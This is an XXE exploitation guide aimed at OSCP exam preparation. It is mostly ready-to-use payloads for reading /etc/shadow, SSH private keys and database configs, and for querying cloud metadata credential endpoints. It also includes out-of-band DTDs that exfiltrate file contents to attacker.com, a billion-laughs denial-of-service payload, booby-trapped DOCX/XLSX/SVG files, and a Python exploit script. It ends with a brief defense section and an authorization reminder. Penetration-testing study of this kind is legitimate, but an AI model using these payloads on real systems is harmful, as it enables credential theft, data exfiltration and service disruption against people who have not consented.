# XML External Entity (XXE) Exploitation Guide

## Table of Contents
1. [XXE Basics](#xxe-basics)
2. [XML Fundamentals](#xml-fundamentals)
3. [Types of XXE Attacks](#types-of-xxe-attacks)
4. [Basic XXE Payloads](#basic-xxe-payloads)
5. [File Disclosure](#file-disclosure)
6. [SSRF via XXE](#ssrf-via-xxe)
7. [Blind XXE](#blind-xxe)
8. [XXE for OSCP](#xxe-for-oscp)
9. [Advanced Techniques](#advanced-techniques)

---

## XXE Basics

### What is XXE?
XML External Entity (XXE) is a vulnerability that allows attackers to interfere with XML processing, potentially leading to:
- **File disclosure** (reading local files)
- **SSRF** (Server-Side Request Forgery)
- **DoS** (Denial of Service)
- **RCE** (in rare cases with specific configurations)

### Requirements
1. Application parses XML input
2. XML parser allows external entities
3. Parser not configured securely (libxml2, DOM, SAX, etc.)

### Impact
- Read sensitive files (/etc/passwd, config files, source code)
- Internal network scanning (SSRF)
- Denial of Service (billion laughs attack)
- Potential RCE (PHP expect:// wrapper, etc.)

---

## XML Fundamentals

### Basic XML Structure
```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <element>value</element>
    <nested>
        <child>data</child>
    </nested>
</root>
```

### XML Entities
```xml
<!-- Internal Entity -->
<!DOCTYPE foo [
  <!ENTITY myentity "my value">
]>
<root>&myentity;</root>
<!-- Outputs: my value -->

<!-- External Entity -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
<!-- Outputs: contents of /etc/passwd -->
```

### Parameter Entities
```xml
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
```

---

## Types of XXE Attacks

### 1. Classic XXE (Direct)
- Entity defined and used in XML
- Response contains file contents
- Easiest to detect and exploit

### 2. Blind XXE (OOB)
- No direct output in response
- Use Out-of-Band techniques
- Exfiltrate data to attacker server

### 3. Error-Based XXE
- Trigger errors containing sensitive data
- Use invalid file paths with data

### 4. XXE via File Upload
- Upload SVG, DOCX, XLSX with XXE payload
- Parser processes embedded XML

---

## Basic XXE Payloads

### Read Local File (Linux)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### Read Local File (Windows)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>
  <data>&xxe;</data>
</root>
```

### PHP Wrapper (Base64)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### Expect Module (RCE - if enabled)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>
  <data>&xxe;</data>
</root>
```

---

## File Disclosure

### Read /etc/passwd
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>
```

### Read /etc/shadow (if permissions allow)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<root>&xxe;</root>
```

### Read SSH Private Keys
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">
]>
<root>&xxe;</root>

<!-- Alternative users -->
<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///home/admin/.ssh/id_rsa">
```

### Read Web Application Config Files
```xml
<!-- PHP -->
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">

<!-- Apache -->
<!ENTITY xxe SYSTEM "file:///etc/apache2/sites-enabled/000-default.conf">

<!-- Nginx -->
<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf">

<!-- Tomcat -->
<!ENTITY xxe SYSTEM "file:///usr/share/tomcat9/conf/tomcat-users.xml">

<!-- MySQL -->
<!ENTITY xxe SYSTEM "file:///etc/mysql/my.cnf">
```

### Read Database Credentials
```xml
<!-- WordPress -->
<!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php">

<!-- Drupal -->
<!ENTITY xxe SYSTEM "file:///var/www/html/sites/default/settings.php">

<!-- Laravel -->
<!ENTITY xxe SYSTEM "file:///var/www/html/.env">

<!-- Generic -->
<!ENTITY xxe SYSTEM "file:///var/www/html/config/database.php">
```

### Read Source Code
```xml
<!-- PHP filter for base64 encoding (bypasses special chars) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<root>&xxe;</root>

<!-- Then base64 decode the output -->
```

### Windows File Disclosure
```xml
<!-- win.ini -->
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">

<!-- System32 files -->
<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">

<!-- IIS config -->
<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">

<!-- Application config -->
<!ENTITY xxe SYSTEM "file:///c:/xampp/htdocs/config.php">
```

---

## SSRF via XXE

### Port Scanning
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:22">
]>
<root>&xxe;</root>

<!-- Scan internal network -->
<!ENTITY xxe SYSTEM "http://192.168.1.1:80">
<!ENTITY xxe SYSTEM "http://192.168.1.1:8080">
<!ENTITY xxe SYSTEM "http://192.168.1.1:3306">
```

### Access Internal Services
```xml
<!-- Internal web application -->
<!ENTITY xxe SYSTEM "http://localhost:8080/admin">

<!-- Cloud metadata (AWS) -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

<!-- Cloud metadata (Azure) -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">

<!-- Cloud metadata (GCP) -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
```

### Interact with Internal APIs
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-api:8080/users">
]>
<root>&xxe;</root>
```

---

## Blind XXE

### Out-of-Band (OOB) XXE - Basic
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<root>&xxe;</root>

<!-- Start listener on attacker machine -->
sudo python3 -m http.server 80
```

### OOB Data Exfiltration
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<root></root>
```

**evil.dtd (on attacker server):**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### OOB with Parameter Entities
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root></root>
```

**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

### Blind XXE via Error Messages
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root></root>
```

### DNS-Based Blind XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root></root>
```

**evil.dtd:**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://%file;.attacker.com/'>">
%all;
```

---

## XXE for OSCP

### Common OSCP XXE Scenarios

#### 1. File Read for Credentials
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<credentials>
  <username>admin</username>
  <password>&xxe;</password>
</credentials>
```

**Then decode:**
```bash
echo "base64_output_here" | base64 -d
```

#### 2. Read SSH Keys
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/admin/.ssh/id_rsa">
]>
<data>&xxe;</data>
```

**Use key:**
```bash
chmod 600 id_rsa
ssh -i id_rsa admin@target.com
```

#### 3. SSRF to Internal Service
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin/users">
]>
<data>&xxe;</data>
```

#### 4. Complete OSCP XXE Exploit Example
```python
#!/usr/bin/env python3
import requests
import base64

target_url = "http://target.com/xml-endpoint"

# XXE payload to read /etc/passwd
xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>"""

headers = {
    'Content-Type': 'application/xml'
}

print("[*] Sending XXE payload...")
response = requests.post(target_url, data=xxe_payload, headers=headers)

if response.status_code == 200:
    print("[+] Response received:")
    # Extract base64 data from response
    # Parse XML response and decode base64
    print(response.text)
else:
    print(f"[-] Request failed: {response.status_code}")
```

---

## Advanced Techniques

### XXE in SOAP
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <foo>&xxe;</foo>
  </soap:Body>
</soap:Envelope>
```

### XXE in SVG Upload
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**Upload as image.svg**

### XXE in DOCX Files
```bash
# Unzip DOCX
unzip document.docx -d docx_extracted

# Edit docx_extracted/word/document.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document>
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>

# Rezip
cd docx_extracted
zip -r ../malicious.docx *
```

### XXE in XLSX Files
```bash
# Unzip XLSX
unzip spreadsheet.xlsx -d xlsx_extracted

# Edit xlsx_extracted/xl/workbook.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook>
  <sheets>
    <sheet name="Sheet1">&xxe;</sheet>
  </sheets>
</workbook>

# Rezip
cd xlsx_extracted
zip -r ../malicious.xlsx *
```

### Billion Laughs Attack (DoS)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

### JAR Protocol (Java)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:file:///var/www/html/upload/shell.zip!/shell.php">
]>
<root>&xxe;</root>
```

### FTP Protocol
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "ftp://attacker.com/file.txt">
]>
<root>&xxe;</root>
```

---

## Detection and Testing

### Identify XML Endpoints
```
Content-Type: application/xml
Content-Type: text/xml
Accept: application/xml
```

### Burp Suite Testing
```
1. Intercept request with XML body
2. Insert XXE payload
3. Send request
4. Check response for file contents
```

### Manual Testing Steps
```
1. Find XML input (API, SOAP, file upload)
2. Test basic XXE:
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
3. Reference entity: &xxe;
4. Check response
5. If blocked, try:
   - PHP filter (base64)
   - Parameter entities
   - Blind OOB XXE
```

---

## Payloads Cheat Sheet

### Quick Test Payloads

#### Linux - /etc/passwd
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

#### Windows - win.ini
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>
```

#### PHP Filter (Base64)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>
```

#### SSRF to Localhost
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:80">]>
<root>&xxe;</root>
```

#### OOB XXE Detection
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR_IP/xxe-test">]>
<root>&xxe;</root>
```

---

## Common Files to Target

### Linux
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/proc/self/environ
/proc/self/cmdline
/home/user/.ssh/id_rsa
/home/user/.ssh/authorized_keys
/root/.ssh/id_rsa
/var/www/html/config.php
/var/www/html/wp-config.php
/var/log/apache2/access.log
~/.bash_history
```

### Windows
```
c:/windows/win.ini
c:/windows/system32/drivers/etc/hosts
c:/inetpub/wwwroot/web.config
c:/xampp/htdocs/config.php
c:/wamp/www/config.php
c:/windows/system32/config/sam
c:/boot.ini
```

---

## Defense (For Understanding)

### Disable External Entities (PHP)
```php
libxml_disable_entity_loader(true);
```

### Disable External Entities (Java)
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

### Disable External Entities (Python)
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False)
```

---

## Tools

### XXE Testing Tools
```bash
# XXEinjector
git clone https://github.com/enjoiz/XXEinjector
ruby XXEinjector.rb --host=target.com --path=/upload --file=payload.xml

# Burp Suite Pro
- XXE Scanner extension

# Manual testing (most reliable)
curl -X POST -H "Content-Type: application/xml" -d @payload.xml http://target.com/xml
```

---

## OSCP Exam Tips

1. **Look for XML endpoints** - API, file upload, SOAP
2. **Try basic file read first** - /etc/passwd
3. **Use PHP filter for base64** - bypasses special characters
4. **Read config files** - database credentials common target
5. **Combine with other vulns** - XXE → credentials → SSH access
6. **Document clearly** - explain what file was read and why it matters

---

## Quick Reference

### Basic XXE Template
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### PHP Filter Template
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>
```

### Blind XXE Template
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR_IP/evil.dtd"> %xxe;]>
<root></root>
```

---

**Remember**: XXE can lead to sensitive file disclosure, SSRF, and even RCE. Always test ethically with proper authorization!
